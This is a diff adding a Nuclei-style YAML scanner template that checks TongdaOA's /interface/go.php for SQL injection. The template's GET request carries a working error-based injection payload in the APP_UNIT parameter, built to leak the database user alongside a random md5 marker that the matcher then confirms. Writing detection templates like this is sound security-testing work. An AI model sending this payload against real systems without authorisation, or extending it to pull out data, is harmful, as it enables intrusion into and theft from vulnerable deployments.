@@ -1,0 +1,24 @@
+id: poc-yaml-tongda-interface-gophp-sqli
+info:
+  name: TongdaOA /interface/go.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 9999)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/interface/go.php?APP_UNIT=a%27%20and%201=(select%201%20from(select%20count(*),concat(md5({{t1}}),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%271%27=%271"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
